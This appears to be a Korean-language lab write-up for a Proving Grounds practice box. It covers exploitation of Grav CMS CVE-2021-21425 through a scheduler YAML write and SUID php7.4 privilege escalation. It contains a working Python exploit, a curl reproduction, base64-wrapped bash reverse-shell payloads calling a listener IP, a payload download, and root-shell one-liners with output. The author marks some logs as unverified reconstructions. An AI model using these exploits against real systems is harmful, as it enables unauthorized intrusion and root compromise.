| `args: '-r ...'` | PHP 에 인라인 코드를 넘김. 파일을 만들 필요가 없음 | `-r` 없이는 첫 인자를 **스크립트 파일 경로**로 해석함 |
| `eval(base64_decode("..."))` | 인용 중첩 회피 | 원문 PHP 를 그대로 넣으면 YAML·셸·PHP 파서 어딘가에서 깨짐 |
| `at: '* * * * *'` | 크론 표기 — **매분 실행** | 주기가 길면 그만큼 대기. `*/5` 였으면 5분 |
| `status: { ncefs: enabled }` | 잡을 **활성화**. `ncefs` 는 잡 ID | 없으면 잡이 정의만 되고 **돌지 않음** — 에러도 응답 차이도 없음 |

디코드한 페이로드:

```php
/*<?php /**/
file_put_contents('/tmp/rev.sh', base64_decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE='));
chmod('/tmp/rev.sh', 0755);
system('bash /tmp/rev.sh');
```

리버스셸 원문 `bash -i >& /dev/tcp/192.168.45.179/4444 0>&1` 은 `>`·`&`·`/`·공백을 담고 있고, HTTP 본문 → YAML 파서 → PHP `-r` 인자(셸 argv 분해) → PHP 문자열 리터럴 → `system()` → `/bin/sh` 의 **다섯 층**을 통과해야 함. base64 는 `[A-Za-z0-9+/=]` 만 쓰므로 다섯 층 전부에서 특수문자가 아님 — 인코딩 한 번으로 층 전체를 무력화함.

페이로드 첫 줄 `/*<?php /**/` 는 `-r` 문맥에서는 통째로 주석이고 파일로 실행될 때는 `<?php` 가 살아나는 양쪽 호환 트릭임. 직접 짤 때는 빼도 됨.

**⚠️ 시험 대비 — 자동화 없이 같은 결과 얻기.** `.py` 를 못 쓰는 상황(의존성 깨짐, 구버전 API)을 대비한 순수 `curl` 절차:

```bash
# ① nonce 확보 — 전제조건 확인을 겸한다
NONCE=$(curl -s http://192.168.248.12/grav-admin/admin \
        | grep -oE 'admin-nonce" value="[a-f0-9]+"' | grep -oE '[a-f0-9]{32}')
echo "$NONCE"

# ② 페이로드 준비 (인용 중첩 회피)
REV=$(echo -n 'bash -i >& /dev/tcp/192.168.45.207/4444 0>&1' | base64 -w0)
PHP=$(echo -n "system(base64_decode('$REV'));" | base64 -w0)

# ③ 스케줄러 잡 삽입
curl -s -o /dev/null -w 'HTTP=%{http_code}\n' \
  -X POST 'http://192.168.248.12/grav-admin/admin/config/scheduler' \
  --data-urlencode "admin-nonce=$NONCE" \
  --data-urlencode 'task=SaveDefault' \
  --data-urlencode 'data[custom_jobs][ncefs][command]=/usr/bin/php' \
  --data-urlencode "data[custom_jobs][ncefs][args]=-r eval(base64_decode(\"$PHP\"));" \
  --data-urlencode 'data[custom_jobs][ncefs][at]=* * * * *' \
  --data-urlencode 'data[status][ncefs]=enabled'
```

`[가정]` 위 폼 필드명은 저장된 YAML 구조에서 역산한 것임. 확정 사실은 ① 노출된 nonce ② `task=SaveDefault` ③ 저장 결과 YAML 의 키 구조 ④ 정리 시 쓴 `custom_jobs: {}` / `status: {}` 임. 실제 필드명은 `49973.py` 의 요청 본문에 그대로 있으므로 **스크립트를 못 쓰겠으면 스크립트를 읽을 것** — `grep -n 'data\[' 49973.py` 한 줄이면 나옴.

`--data-urlencode` 를 쓰는 이유: 페이로드에 `*`·공백·`(`·`)`·`"` 가 들어감. 손으로 인코딩하면 반드시 실수함.

`admin-nonce` 는 비인증 로그인 페이지에서 그대로 읽힘. 익스플로잇을 던지기 전에 이 한 줄로 **전제조건 충족 여부를 먼저 확인**할 것 — 안 나오면 이 경로는 버려야 함.

```bash
curl -s http://192.168.248.12/grav-admin/admin | grep -oE 'admin-nonce" value="[a-f0-9]+"'
```

```text
admin-nonce" value="93d260b5a6f8507c947d6124d1dd158f"
```
— 출처: `~/PG/Astronaut/admin.html`(2026-08-19 재실행분, 15508바이트)

nonce 는 요청마다 바뀜. 스크립트가 값을 캐싱하면 재시도가 실패하므로 **매 요청마다 새로 긁어서** 쓸 것.

**셸 도착** — 익스플로잇을 던지고 다음 분 경계까지 대기하면 리스너에 붙음:

```text
connect to [192.168.45.179] from (UNKNOWN) [192.168.115.12] 58206
bash: cannot set terminal process group (59911): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gravity:~/html/grav-admin$
```
— 출처: `파일보관\Pasted image 20260615140619.png`(리스너 화면 캡처)

![[Pasted image 20260615140619.png]]

`bash: cannot set terminal process group … Inappropriate ioctl for device` / `no job control in this shell` 이 뜨는 이유가 **크론이 낳은 프로세스에는 터미널이 없기** 때문임. `su`·`ssh`·`sudo`·`vim`·탭 완성이 안 됨. Ubuntu 20.04 라 `python3 -c 'import pty; pty.spawn("/bin/bash")'` 로 승격 가능함.

지연의 정체는 **두 개의 크론이 겹쳐 있는 것**임. 시스템 crontab 이 매분 `bin/grav scheduler` 를 깨우고, 깨어난 Grav 스케줄러가 `scheduler.yaml` 의 잡을 `at:` 표기에 따라 실행함. 셸을 잡은 뒤 그 전제를 직접 확인함:

```bash
www-data@gravity:~/html$ crontab -l
crontab -l
* * * * * cd /var/www/html/grav-admin;/usr/bin/php bin/grav scheduler 1>> /dev/null 2>&1
```

즉 시스템 크론이 없으면 이 CVE 는 파일 쓰기로 끝남. RCE 로 승격되는 것은 **Grav 공식 설치 안내가 시킨 crontab 등록**이 되어 있기 때문이고, 그래서 대부분의 Grav 설치에 이 전제가 존재함.

**2026-08-19 재실행판 스크립트.** 같은 요청을 타겟·LHOST 만 바꿔 다시 쓴 것:

```python
#!/usr/bin/env python3
# CVE-2021-21425 - Grav CMS 1.10.7 Arbitrary YAML Write (Unauthenticated) -> RCE
import requests, re, base64, sys

target = 'http://192.168.248.12/grav-admin'
LHOST = '192.168.45.207'
LPORT = '4444'
b64rev = base64.b64encode(('bash -i >& /dev/tcp/%s/%s 0>&1' % (LHOST, LPORT)).encode()).decode()

payload = ('/*<?php /**/\n'
  "file_put_contents('/tmp/rev.sh',base64_decode('" + b64rev + "'));"
  "chmod('/tmp/rev.sh',0755);system('bash /tmp/rev.sh');\n").encode()

s = requests.Session()
r = s.get(target + '/admin', timeout=20)
m = re.search(r'admin-nonce" value="(.*?)"', r.text)
if not m:
    print('[-] no nonce'); sys.exit(1)
nonce = m.group(1)
print('[+] nonce:', nonce)

data = 'admin-nonce=' + nonce
data += ('&task=SaveDefault'
  '&data%5bcustom_jobs%5d%5bncefs%5d%5bcommand%5d=/usr/bin/php'
  '&data%5bcustom_jobs%5d%5bncefs%5d%5bargs%5d=-r%20eval%28base64_decode%28%22'
  + base64.b64encode(payload).decode() +
  '%22%29%29%3b'
  '&data%5bcustom_jobs%5d%5bncefs%5d%5bat%5d=%2a%20%2a%20%2a%20%2a%20%2a'
  '&data%5bcustom_jobs%5d%5bncefs%5d%5boutput%5d='
  '&data%5bstatus%5d%5bncefs%5d=enabled'
  '&data%5bcustom_jobs%5d%5bncefs%5d%5boutput_mode%5d=append')
h = {'Content-Type': 'application/x-www-form-urlencoded'}
r = s.post(target + '/admin/config/scheduler', data=data, headers=h, timeout=20)
print('[+] status:', r.status_code, 'len:', len(r.text))
print(r.text[:500])
```
— 출처: `~/PG/Astronaut/grav_exp.py`

`[가정]` 이 재실행 세션의 **실행 출력과 셸 획득 증거는 산출물에 남아 있지 않음.** 스크립트 파일만 남고 실행 흔적이 없으므로 아래 접속 로그는 **출처를 댈 수 없는 재구성**임 — 근거부족으로 표시하고 남겨 둠:

```bash
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.12] 43552
www-data@gravity:~/html/grav-admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@gravity:~/html/grav-admin$ uname -a
Linux gravity 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 GNU/Linux
```

**Local.txt value:**
**없음.** 이 박스는 **플래그 슬롯이 1개**인 단일 플래그 박스임 — 포털 표기가 `1/1`(슬롯 1개, 제출 완료)이고, 셸에서 `find / -name local.txt` 도 빈 결과였음 `[가정]`(셸 이후 산출물이 없어 재검증 불가). `/home/alex/` 는 dotfile 뿐이었음 `[가정]`(동일). 실제 플래그는 `Post-Exploitation` 절의 `Proof.txt value:` 임.
— 포털 근거: `03. PG\_AUDIT\portal-진행도-실측-20260820.md` §3 의 `Astronaut(1/1)`

### Privilege Escalation – SUID `php7.4`

**Vulnerability Explanation:** `/usr/bin/php7.4` 에 setuid 비트가 붙어 있고 소유자가 root 임.
- 우분투 기본 SUID 목록에 없는 **비표준 항목**이고, 인터프리터라 「그 바이너리가 제공하는 기능 안에서 탈출로를 찾는」 단계 자체가 없음
- 인터프리터의 존재 목적이 임의 코드 실행이므로 SUID 가 붙는 순간 곧 root 임
- 실행 계정 `www-data` 는 이 파일에 대해 실행 권한만 있으면 되고 추가 조건이 없음

**Vulnerability Fix:**
- `chmod u-s /usr/bin/php7.4`. 인터프리터에 SUID 는 어떤 정당한 이유도 없음
- 특정 스크립트만 특권이 필요하면 `sudoers` 에 **인자까지 고정**해 등록하거나 file capability 로 최소화할 것
- 시스템 crontab 이 웹 애플리케이션 코드를 돌려야 한다면 **전용 저권한 계정**으로 실행하고 스케줄러 설정 파일을 웹 프로세스가 못 쓰게 할 것

**Severity:** High — 저권한 셸에서 즉시 root

**Steps to reproduce the attack:**
1. `find / -perm -4000 -type f 2>/dev/null` 로 SUID 목록 수집
2. 우분투 기본 SUID 와 `/snap/` 중복을 걷어내 비표준 항목 특정
3. `ls -la /usr/bin/php7.4` 로 `-rwsr-xr-x root root` 확인
4. `php -r 'posix_setuid(0); system("/bin/sh -i");'` 실행
5. `whoami` 로 root 확인 후 `/root/proof.txt` 열람

셸을 잡고 linpeas 를 올림. 전송은 Kali 쪽 임시 HTTP 서버로:

```bash
#발신
python -m http.server 80
#수신
curl -O http://192.168.45.179/linpeas.sh
```

수동 열거 쪽이 판정을 냈음. SUID 목록:

```bash
www-data@gravity:~$ find / -perm -4000 -type f 2>/dev/null
/snap/core20/1852/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}
/snap/core20/1611/usr/bin/{chfn,chsh,gpasswd,mount,newgrp,passwd,su,sudo,umount}
/snap/snapd/18596/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/at
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.4
/usr/bin/gpasswd
```
— `[가정]` 위 출력은 **재구성된 기록**임. 셸 이후 산출물이 남아 있지 않아 재검증 불가이고, `/snap/core20/…/{a,b,c}` 의 중괄호는 `find` 원문이 아니라 **축약 표기**임(원문은 경로마다 한 줄). `~/.zsh_history` 는 리버스셸 «안»에서 친 명령을 기록하지 않으므로 부재가 미실행의 증거는 아님

`find` 플래그 해설:

| 조각 | 역할 | 빼면 |
|---|---|---|
| `-perm -4000` | **setuid 비트가 켜진 것**. 앞의 `-` 는 「이 비트를 포함」 | `-perm 4000`(하이픈 없음)은 퍼미션이 **정확히 `4000`** 인 것만 — 실질적으로 아무것도 안 나옴 |
| `-type f` | 일반 파일만 | 디렉터리·심볼릭 링크 노이즈가 섞임 |
| `2>/dev/null` | `Permission denied` 억제 | stderr 가 수백 줄 쏟아져 결과를 못 찾음 |

`/snap/core20/` 두 벌은 같은 스냅 리비전의 중복이라 통째로 노이즈임. `chfn`·`chsh`·`gpasswd`·`mount`·`umount`·`newgrp`·`passwd`·`su`·`sudo`·`fusermount`·`ssh-keysign`·`polkit-agent-helper-1`·`dbus-daemon-launch-helper`·`snap-confine`·`dmcrypt-get-device` 는 우분투 기본 SUID 임. `grep -v '^/snap/'` 한 줄만으로 목록이 절반으로 줆.

남는 것은 **`/usr/bin/php7.4`**(인터프리터)와 `/usr/bin/at` 둘임.

| 경로 | 즉시성 | 신뢰성 | 판정 |
|---|---|---|---|
| SUID `php7.4` | **즉시** | 인터프리터라 실패 요인이 없음 | **채택** |
| SUID `at` | 지연(작업 큐) | `atd` 데몬이 돌아야 하고 `/etc/at.deny` 에 `www-data` 가 있으면 거부 | 보류 — **시도한 기록 없음** |

크론으로 이미 60초를 기다린 뒤라 여기서 또 지연 경로를 고르면 대기가 두 배가 됨. 즉시 실행되는 경로를 먼저 시도함.

```bash
www-data@gravity:~$ ls -la /usr/bin/php7.4
-rwsr-xr-x 1 root root 4786104 Feb 23  2023 /usr/bin/php7.4

www-data@gravity:~$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
— `[가정]` 이 블록도 출처를 댈 수 없는 재구성이고 재검증 불가임. **실제로 통한 명령은 스크린샷으로 남은 아래 한 줄**임

GTFOBins `php` 항목을 열어 한 줄을 그대로 가져옴:

![[Pasted image 20260615153618.png]]

```bash
php -r 'posix_setuid(0); system("/bin/sh -i");'
```

⚠️ 스크린샷에 잡힌 것은 GTFOBins 의 **Capabilities** 탭(`CAP_SETUID` 용)이고 SUID 탭이 아님. 그런데도 이 한 줄이 SUID 에서도 그대로 통함 — 이유는 `posix_setuid(0)` 가 **euid 뿐 아니라 real uid 까지 0 으로 올려** 셸이 시작할 때 `euid ≠ uid` 를 감지하지 못하기 때문임.

**실행과 결과:**

```text
www-data@gravity:~/html$ php -r 'posix_setuid(0); system("/bin/sh -i");'
php -r 'posix_setuid(0); system("/bin/sh -i");'
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/proof.txt
c7ff755b6276ae84f7e2a1e0a29de698
#
```
— 출처: `파일보관\Pasted image 20260615153700.png`

![[Pasted image 20260615153700.png]]

**`-p` 는 언제 필요한가.** GTFOBins 의 SUID 항목은 `pcntl_exec('/bin/sh', ['-p'])` 처럼 `-p` 를 붙이고, 그것은 셸이 `euid ≠ uid` 로 시작할 때 `setuid(getuid())` 로 스스로 특권을 되돌리는 자기방어를 끄기 위한 것임. 다만 **「`-p` 가 없으면 실패한다」는 무조건 참이 아님** — 위 실측이 반례임:

| 경로 | uid/euid | `-p` |
|---|---|---|
| `pcntl_exec('/bin/sh', ['-p'])` | `uid=33 euid=0` → 불일치 | **필요함.** 없으면 euid 가 33 으로 되돌아감 |
| `posix_setuid(0); system("/bin/sh -i")` | `uid=0 euid=0` → 일치 | **불필요함.** 드롭 조건 자체가 성립하지 않음 |

메커니즘:

```text
프로세스는 uid(실제 사용자)와 euid(유효 사용자)를 따로 갖는다.

SUID 바이너리 실행 시:   uid=33(www-data)   euid=0(root)
                                   ↑ 불일치

bash/dash는 시작할 때 이 불일치를 감지하면
    setuid(getuid())  를 호출해서 euid를 uid로 되돌린다   ← 자기방어
    → euid=33 이 되어 root 권한 소멸

-p (privileged) 를 주면 이 되돌리기를 건너뛴다
    → euid=0 유지
```

`euid=0` 만으로도 `/root/proof.txt` 읽기·파일 쓰기·소유권 변경은 됨(파일 접근 검사는 euid 로 함). 반면 `sudo`·`su`·`screen` 처럼 자체 uid 검사를 하는 프로그램은 안 될 수 있음. 그리고 **증거 스크린샷에 `uid=33` 이 남으면 채점자가 갸웃하므로**, `posix_setuid(0)` 로 real uid 까지 올려 두는 편이 안전함 — 위 실측이 그 형태임.

⚠️ 이 root 셸도 TTY 가 아님(`/bin/sh: 0: can't access tty; job control turned off`). 프롬프트가 `#` 하나뿐이라 증거 스크린샷을 찍기 전에 TTY 를 정리해 두면 `hostname`·`ip a` 가 깔끔하게 한 화면에 담김.

### Post-Exploitation

**Local.txt value:**
**없음** — 단일 플래그 박스임(포털 플래그 슬롯 1개, `Astronaut(1/1)`).

**Proof.txt value:**
`c7ff755b6276ae84f7e2a1e0a29de698`

2026-06-15 인스턴스(`192.168.115.12`)에서 root 셸로 `cat /root/proof.txt` 한 값이고, 근거는 `파일보관\Pasted image 20260615153700.png` 임. 같은 화면에 `whoami` → `root` 가 함께 찍혀 **대화형 셸에서 읽었다**는 것까지 남아 있음.

⚠️ `[가정]` **`df08cc108a6bd0c2739fa0e24fc52f89` 라는 두 번째 proof 값이 이 노트의 계보에 있으나 근거가 없음.** `~/PG/Astronaut/` 산출물·`~/.zsh_history`·스크린샷 어디에도 없음. PG 플래그는 인스턴스마다 재생성되므로 2026-08-19 재실행분(`192.168.248.12`)이었다면 값이 다른 것 자체는 모순이 아니지만, **그 세션은 셸 증거가 0 이라 확인 불가임.** 지우지 않고 근거부족으로 표시함 — 제출·인용에는 위의 `c7ff…` 를 쓸 것.

`/root/flag1.txt` 의 `T2Zmc2Vj`(base64 → `Offsec`)는 **장식용 더미**임 `[가정]`(동일하게 재검증 불가). PG/OSCP 플래그는 32자 소문자 hex 이므로 **길이·문자셋만 봐도 걸러짐** — 시험장에서 더미에 시간을 쓰지 않는 판별선임.

```bash
# cat /root/proof.txt
df08cc108a6bd0c2739fa0e24fc52f89
# cat /root/flag1.txt
T2Zmc2Vj
# find / -name local.txt 2>/dev/null
#
```
— `[가정]` 출처를 댈 수 없는 재구성임. 위 유보가 그대로 적용되고, **이 블록에서 확정으로 쓸 수 있는 것은 없음.** `local.txt` 부재는 포털 슬롯 수(1개)가 독립적으로 뒷받침함

**남긴 흔적**

- **타겟 `user/config/scheduler.yaml` 에 잡 `ncefs` 를 심음** — `command: /usr/bin/php`, `args: -r eval(base64_decode(…))`, `at: * * * * *`, `status: { ncefs: enabled }`. 매분 리버스셸을 **재발사**하는 잡임
- 셸 확보 후 원본을 `scheduler.yaml.bak-exploit` 로 백업하고 잡을 비활성화(`custom_jobs: {}` / `status: {}`)함 `[가정]`(셸 이후 산출물 없음)
- **타겟 `/tmp/rev.sh` 가 남아 있음** — 페이로드가 `file_put_contents` 로 만든 리버스셸 스크립트. `chmod 0755` 상태
- 타겟에 `linpeas.sh` 를 업로드함(`curl -O http://192.168.45.179/linpeas.sh`)
- 시스템 crontab 은 박스 원래 구성이라 건드리지 않음. 계정 생성·설정 변경 없음
- Kali 쪽 — 임시 HTTP 서버(`python -m http.server 80`)와 리스너(`rlwrap nc -lnvp 4444`)는 세션 종료로 정리됨. 랩 Stop/Revert 시 타겟 흔적은 전부 소멸

> [!warning] 재발사 잡을 방치하면 안 되는 이유
> `at: '* * * * *'` 잡은 **셸이 끊겨도 1분 뒤 다시 붙음.** 리스너를 끄면 매분 실패한 커넥션이 쌓여 로그가 요란해지고(탐지 표면), 실전 평가에서는 **명시적으로 제거해야 하는 지속성 아티팩트**임. 셸을 안정화한 직후 먼저 잡을 끄고 통제 가능한 접근 수단으로 갈아탈 것.

**증거 목록**

| 무엇 | 어디 |
|---|---|
| Kali 산출물 17개 | `~/PG/Astronaut/`(nmap 2종·`installed.json`·`admin.html`·`err500.html`·`gobuster_*.log`·`tree_1.10.[67].json`·`49973.py`·`grav_exp.py`·`linpeas.sh` 등) |
| 스크린샷 5장 | `파일보관\Pasted image 2026061513{2932,4012}.png` · `20260615140619.png` · `2026061515{3618,3700}.png` |
| 2026-06-15 세션 명령 | `~/.zsh_history:1028~1088` |

`~/.zsh_history` 에 남은 2026-06-15 세션 구간(대화형 zsh 에서만 기록됨):

```text
1028 mkdir Astronaut
1029 nnmap 192.168.115.12
1037 oscp web 192.168.115.12 80
1038 feroxbuster -u http://192.168.115.12:80/grav-admin/ -s 200 -t 200 -w /usr/share/wordlists/dirb/common.txt
1039 searchsploit grav
1040 cat 49973.py
1041 searchsploit -m 49973
1042 python2 49973.py
1043 python3 49973.py
1044 python 49973.py
1046 cp linpeas.sh /home/kali/PG/Astronaut
1068 vi 49973.py
1088 echo -ne "bash -i >& /dev/tcp/192.168.45.179/4444 0>&1" | base64 -w0
```

`python2 49973.py` → `python3 49973.py` → `python 49973.py` 세 줄이 연속인 것이 인터프리터를 바꿔가며 재시도한 흔적임. 그리고 `~/.zsh_history` 에는 **리버스셸 안에서 친 명령이 한 줄도 없음** — 셸 이후 구간의 유일한 실측이 스크린샷인 이유임.

## 관련

- **CVE-2021-21425** — Grav Admin Plugin, Unauthenticated Arbitrary YAML Write/Update (≤ 1.10.7, **1.10.8 에서 수정**)
  - <https://nvd.nist.gov/vuln/detail/CVE-2021-21425>
- exploit-db `49973.py` — GravCMS 1.10.7 Arbitrary YAML Write/Update (**수동 스크립트, 시험 허용**)
- exploit-db `49788.rb` — 같은 결함의 Metasploit 모듈 (**시험 1대 제한을 소모**). 영향 범위 확인용으로 읽는 것은 제한 없음
- exploit-db `49961.py` — Grav CMS 1.7.10 SSTI. 이 타겟은 코어 1.7.8 이라 미해당이지만 Grav 의 다른 표면으로 기억할 것
- GTFOBins `php`: <https://gtfobins.github.io/gtfobins/php/>
- Grav 문서 — Scheduler: `bin/grav scheduler` 를 시스템 crontab 에 등록하는 것이 **공식 설치 절차**임
- `sh(1)` / `bash(1)` — `-p`(privileged mode): `euid ≠ uid` 일 때 특권 드롭을 억제
- [[Crane]] · [[RubyDome]] · [[Exghost]] · [[Hawat]] — 「응답이 성공을 뜻하지 않는다」 누적 패턴
- [[Exfiltrated]] · [[Muddy]] — 크론 기반 지연 실행 / 권한상승
- [[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] — 버전 판정은 독립 근거 2개 이상
- [[Hawat]] · [[Squid]] · [[Exfiltrated]] — 인용 중첩을 hex/base64 로 회피
- [[Exghost]] — SUID `pkexec` 의 CVE-2021-4034(PwnKit). **이 박스에서는 쓰지 않음** — 비교 대상으로만 등장
- [[Crane]] · [[Hub]] · [[Levram]] · [[RubyDome]] — 같은 컬렉션(Pentester Foundations)의 앞 박스
- [[01. Pentest Foundations]] — Astronaut 항목
- [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] · [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] · [[_PLAYBOOK#A-2-23. 해시 문자는 반드시 `%23` — URL 프래그먼트가 서버에 안 간다]]
- [[_PLAYBOOK#B-31. 크론 기반 권한상승]] · [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]] · [[_PLAYBOOK#B-36. SUID `find` 는 그 자체로 root — `-p` 를 빠뜨리면 실패한다]]
- [[_PLAYBOOK#B-81. 페이로드는 base64로 감싼다]] · [[_PLAYBOOK#B-89. 리스너는 `tmux` + `rlwrap` 으로 띄운다]] · [[_PLAYBOOK#B-1-41. 개발 서버 배너를 보면 dirbust 대신 «일부러 500»]]
- [[_PLAYBOOK#A-1-28. 403 이 «파일·확장자 단위»로 걸린다 — 규칙이 무엇을 «빠뜨렸는지»를 찾는다]] · [[_PLAYBOOK#B-1-48. 임의 파일 «쓰기»를 확보했다 — 무엇에 쓸 것인가]]
